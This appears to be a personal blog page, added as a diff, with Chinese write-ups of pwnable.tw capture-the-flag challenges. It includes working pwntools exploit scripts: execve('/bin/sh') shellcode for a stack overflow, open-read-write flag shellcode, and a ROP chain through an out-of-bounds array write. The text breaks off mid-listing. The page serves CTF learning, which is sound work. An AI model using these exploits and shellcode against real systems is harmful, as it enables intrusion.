@@ -1,0 +1,530 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>pwnable.tw记录 | winter - 像初雪一样自由洒落</title>
+  <meta name="author" content="winter">
+  
+  <meta name="description" content="pwnable.tw记录
+更新中.jpg
+
+start
+栈溢出，ret2shellocde
+程序流程：执行一次write函数和一次read函数。
+
+第一次栈溢出，劫持程序返回write函数的赋参地址（接下来write会将之前的esp地址输出）
+第二次write输出esp地址，read函数布置栈空间，">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="pwnable.tw记录"/>
+  <meta property="og:site_name" content="winter - 像初雪一样自由洒落"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">winter - 像初雪一样自由洒落</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> pwnable.tw记录</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="pwnable-tw记录"><a href="#pwnable-tw记录" class="headerlink" title="pwnable.tw记录"></a>pwnable.tw记录</h1><blockquote>
+<p>更新中.jpg</p>
+</blockquote>
+<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><blockquote>
+<p>栈溢出，ret2shellocde</p>
+<p>程序流程：执行一次write函数和一次read函数。</p>
+<ul>
+<li>第一次栈溢出，劫持程序返回write函数的赋参地址（接下来write会将之前的esp地址输出）</li>
+<li>第二次write输出esp地址，read函数布置栈空间，放上shellcode，并通过esp的偏移找到shellcode的地址，放在返回地址上。</li>
+</ul>
+</blockquote>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CDesktop%5C20200423213641742.png" alt="20200423213641742"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210104164903387.png" alt="image-20210104164903387"></p>
+<p>因为第一次最后面retn的时候pop eip，所以第二次write的时候，esp会在0xffffd10c也就是旧的esp的地方。</p>
+<p>第二次read的时候，因为add esp,14h，所以这里的覆盖量还是0x14</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./start'</span></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048060")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Let's start the CTF:"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x14</span>+p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)<span class="comment">#不是sendline，否则0x0a会覆盖esp地址的低地址</span></span><br><span class="line"></span><br><span class="line">esp = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"esp:"</span>+hex(esp))</span><br><span class="line">shellcode_addr = esp + <span class="number">0x14</span><span class="comment">#后来的返回地址和之前的esp就差一个0x14，因为最后一个（add esp,14h）</span></span><br><span class="line">log.success(<span class="string">"shellcode_addr:"</span>+hex(shellcode_addr))</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span><span class="comment">#32位较短的shellcode</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"b"</span>*<span class="number">0x14</span>+p32(shellcode_addr) + shellcode</span><br><span class="line">log.success(<span class="string">"len:"</span>+hex(len(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/105717621" target="_blank" rel="noopener">https://blog.csdn.net/qq_43935969/article/details/105717621</a></p>
+<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><blockquote>
+<p>开启了沙箱，只能执行open、read和write函数</p>
+<p>程序流程：输入shellcode，执行shellcode，但shellcode里面只能orw</p>
+<p>找orw的shellcode即可。</p>
+<p><a href="https://xz.aliyun.com/t/6645?spm=5176.12901015.0.i12901015.5e28525cINEQJh#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6645?spm=5176.12901015.0.i12901015.5e28525cINEQJh#toc-3</a></p>
+</blockquote>
+<p>shellcode的编写思路</p>
+<ol>
+<li><p>打开flag文件（open）</p>
+</li>
+<li><p>将文件内内容读到（read）指定位置的栈上（其实哪里东西，，，注意不会被覆盖就行）</p>
+</li>
+<li><p>用write函数读取指定位置的信息即可。</p>
+</li>
+</ol>
+<h3 id="32位函数寄存器"><a href="#32位函数寄存器" class="headerlink" title="32位函数寄存器"></a>32位函数寄存器</h3><ul>
+<li>第一个参数：ebx</li>
+<li>第二个参数：ecx</li>
+<li>第三个参数：edx</li>
+</ul>
+<h3 id="int-0x80调用表"><a href="#int-0x80调用表" class="headerlink" title="int 0x80调用表"></a>int 0x80调用表</h3><blockquote>
+<p>几个常用的，不常用的见<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">百度</a></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>%eax</strong></th>
+<th><strong>Name</strong></th>
+<th><strong>Source</strong></th>
+<th><strong>%ebx</strong></th>
+<th><strong>%ecx</strong></th>
+<th><strong>%edx</strong></th>
+<th><strong>%esx</strong></th>
+<th><strong>%edi</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>sys_exit</td>
+<td>kernel/exit.c</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>2</td>
+<td>sys_fork</td>
+<td>arch/i386/kernel/process.c</td>
+<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>3</td>
+<td>sys_read</td>
+<td>fs/read_write.c</td>
+<td>unsigned int</td>
+<td>char *</td>
+<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t" target="_blank" rel="noopener">size_t</a></td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>4</td>
+<td>sys_write</td>
+<td>fs/read_write.c</td>
+<td>unsigned int</td>
+<td>const char *</td>
+<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t" target="_blank" rel="noopener">size_t</a></td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>5</td>
+<td>sys_open</td>
+<td>fs/open.c</td>
+<td>const char *</td>
+<td>int</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>6</td>
+<td>sys_close</td>
+<td>fs/open.c</td>
+<td>unsigned int</td>
+<td>-</td>
+<td>-</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><p>函数原型：<code>int open(const char * pathname, int flags, mode_t mode);</code></p>
+<p>flags表示读写权限，0表示只读</p>
+<ul>
+<li><code>O_RDONLY</code>：以只读方式打开文件。</li>
+<li><code>O_WRONLY</code>：以只写方式打开文件。</li>
+<li><code>O_RDWR</code>：以可读写方式打开文件。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int fd = open(<span class="string">"/home/orw/flag"</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#将字符串"/home/orw/flag"放入栈中</span></span><br><span class="line">push <span class="number">0x00006761</span></span><br><span class="line">push <span class="number">0x6c662f77</span></span><br><span class="line">push <span class="number">0x726f2f65</span></span><br><span class="line">push <span class="number">0x6d6f682f</span></span><br><span class="line"></span><br><span class="line">/bin/sh</span><br><span class="line"><span class="number">0x0068732f</span></span><br><span class="line"><span class="number">0x00006873</span></span><br><span class="line"><span class="number">0x6E69622f</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x5#open函数调用号</span><br><span class="line">mov ebx,esp#第一个参数为字符串地址，因为字符串在刚刚压栈，就是esp</span><br><span class="line">xor ecx,ecx#第二个参数为0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210104213908883.png" alt="image-20210104213908883"></p>
+<h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>函数原型：<code>ssize_t read(int fd, void *buf, size_t count);</code></p>
+<p>fd是文件描述符</p>
+<ul>
+<li><p>标准输入（standard input）的文件描述符是 0</p>
+</li>
+<li><p>标准输出（standard output）的文件描述符是 1</p>
+</li>
+</ul>
+<p>所以这里将open函数的返回值作为文件描述符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(fd,buf,<span class="number">0x30</span>);//直接用之前的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,eax#fp的地址，也就是open函数返回地址</span><br><span class="line">mov ecx,esp#读入到栈上，因为后续没有push、pop等操作，所以esp不变</span><br><span class="line">mov edx,0x30#长度</span><br><span class="line">mov eax,0x3#read函数调用号</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>函数原型：<code>ssize_t write(int fd, const void *buf, size_t nbyte);</code></p>
+<p>标准输出，故文件描述符为1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,0x1#文件描述符为1</span><br><span class="line">mov eax,0x4#write函数调用号</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mobile</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./orw'</span></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Give my your shellcode:"</span>)</span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push 0x00006761</span></span><br><span class="line"><span class="string">push 0x6c662f77</span></span><br><span class="line"><span class="string">push 0x726f2f65</span></span><br><span class="line"><span class="string">push 0x6d6f682f</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x30</span></span><br><span class="line"><span class="string">mov eax,0x3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h2><p><a href="https://xz.aliyun.com/t/3710?spm=5176.12901015.0.i12901015.1d27525cNPKLYj#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3710?spm=5176.12901015.0.i12901015.1d27525cNPKLYj#toc-0</a></p>
+<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172</a></p>
+<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172</a></p>
+<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><blockquote>
+<p>实现了一个计算器的功能，由于逻辑不严密，导致可以构造非法式子，修改内存的值。</p>
+<p>需要耐心分析程序，<del>maybe还需要脑洞大开</del></p>
+</blockquote>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210108173852141.png" alt="image-20210108173852141"></p>
+<p>主函数很简单，主要看calc函数</p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210108174030310.png" alt="image-20210108174030310"></p>
+<p>主要有三个函数，get_expr用来输入计算公式并过滤非法字符；init_pool在站上分配一段空间并将内容清0；parse_expr是主要函数，用于对计算公式解析并计算。最后由printf函数打印输出结果。</p>
+<p>注意：函数结束的条件是<code>!get_expr((int)&amp;expr_0, 1024)</code>输入的字符串长度大于1024，然后可以返回main继续执行。</p>
+<h3 id="bzero函数"><a href="#bzero函数" class="headerlink" title="bzero函数"></a>bzero函数</h3><p>原型：extern void bzero（void *s, int n）;</p>
+<ul>
+<li>s 要置零的数据的起始地址</li>
+<li>n 要置零的数据字节个数</li>
+</ul>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210108174912889.png" alt="image-20210108174912889"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210108175150201.png" alt="image-20210108175150201"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110211310303.png" alt="image-20210110211310303"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110211900726.png" alt="image-20210110211900726"></p>
+<p>这里需要好好理解。</p>
+<p>漏洞在于，</p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110212502340.png" alt="image-20210110212502340"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110213412358.png" alt="image-20210110213412358"></p>
+<p>最后在栈内布置如下rop</p>
+<table>
+<thead>
+<tr>
+<th>值</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x0805c34b</td>
+<td>pop eax ; ret</td>
+</tr>
+<tr>
+<td>11</td>
+<td>数值</td>
+</tr>
+<tr>
+<td>0x080701aa</td>
+<td>pop edx ; ret</td>
+</tr>
+<tr>
+<td>0</td>
+<td>数值</td>
+</tr>
+<tr>
+<td>0x080701d1</td>
+<td>pop ecx ; pop ebx ; ret</td>
+</tr>
+<tr>
+<td>0</td>
+<td>数值</td>
+</tr>
+<tr>
+<td>binsh地址</td>
+<td>通过main ebp计算得到</td>
+</tr>
+<tr>
+<td>0x08049a21</td>
+<td>int 0x80</td>
+</tr>
+<tr>
+<td>0x6E69622f</td>
+<td>“/bin”</td>
+</tr>
+<tr>
+<td>0x0068732f</td>
+<td>“/sh\x00”</td>
+</tr>
+</tbody></table>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./calc'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw",10100)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.recvuntil(<span class="string">"==="</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+360"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ebp_base = p.recv()</span><br><span class="line">ebp_base = int(ebp_base)</span><br><span class="line">print(<span class="string">"[*]ebp_base1:"</span>+str(ebp_base))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]ebp_base2:"</span>+hex( int(ebp_base) &amp; <span class="number">0xffffffff</span> ))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"+361+77490"</span></span><br><span class="line">payload2 = <span class="string">"+362-77479"</span></span><br><span class="line">payload3 = <span class="string">"+363+134599427"</span></span><br><span class="line">payload4 = <span class="string">"+364-134599427"</span></span><br><span class="line">payload5 = <span class="string">"+365+77518"</span></span><br><span class="line">payload6 = <span class="string">"+366-77518"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.sendline(payload6)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=ebp_base + <span class="number">4</span></span><br><span class="line">diff_367=bin_sh_addr - <span class="number">77518</span></span><br><span class="line">p.sendline(<span class="string">'+367'</span>+str(diff_367))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'+368'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">num_368 = p.recvline()</span><br><span class="line">diff_368 =  <span class="number">134519329</span> - int(num_368)</span><br><span class="line">print(<span class="string">"[*]diff_368:"</span>+str(diff_368))</span><br><span class="line">print(<span class="string">"[*]num_368:"</span>+str(num_368))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+368"</span>)</span><br><span class="line">p.sendline(<span class="string">"+368+"</span>+str(diff_368))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+369"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">num_369 = p.recvline()</span><br><span class="line">diff_369 = <span class="number">1852400175</span> - int(num_369)</span><br><span class="line">p.sendline(<span class="string">"+369+"</span>+str(diff_369))</span><br><span class="line">print(<span class="string">"[*]num_369:"</span>+str(num_369))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+370"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">num_370 = p.recvline()</span><br><span class="line">print(<span class="string">"[*]num_370:"</span>+str(num_370))</span><br><span class="line">diff_370 = int(num_370) - <span class="number">6845231</span></span><br><span class="line">p.sendline(<span class="string">"+370-"</span>+str(diff_370))</span><br><span class="line">print(<span class="string">"[*]diff_370:"</span>+str(diff_370))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">2048</span>)</span><br><span class="line">p.sendline(<span class="string">"+361"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>参考：</p>
+<p><a href="https://www.freebuf.com/articles/system/189636.html" target="_blank" rel="noopener">从pwnable.tw-calc看数组越界造成的任意地址读写</a></p>
+<p>youtube上视频：<a href="https://www.youtube.com/watch?v=LTgNNE04x2w" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LTgNNE04x2w</a></p>
+<h2 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h2><blockquote>
+<p>栈溢出</p>
+</blockquote>
+<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><blockquote>
+<p>简单的堆题，uaf（类似于hitcon的uaf）</p>
+<p>难点在于libc没有字符串’/bin/sh’，解决方法在于直接将字符串“||sh”作为字符串地址传入即可。</p>
+</blockquote>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110205251966.png" alt="image-20210110205251966"></p>
+<p>打印内容的语句，能否打印是判断该idx的ptr[i]是否存在</p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110205533787.png" alt="image-20210110205533787"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110205601001.png" alt="image-20210110205601001"></p>
+<p>首先修改参数为got表地址，泄漏libc基址，然后修改函数地址为system，后面为“||sh”</p>
+<h3 id="system-getshell参数"><a href="#system-getshell参数" class="headerlink" title="system getshell参数"></a>system getshell参数</h3><ol>
+<li>‘/bin/sh’字符串地址</li>
+<li>‘sh’字符串地址</li>
+<li>‘||sh’字符串（感觉非常有用，，，哈哈哈）</li>
+</ol>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 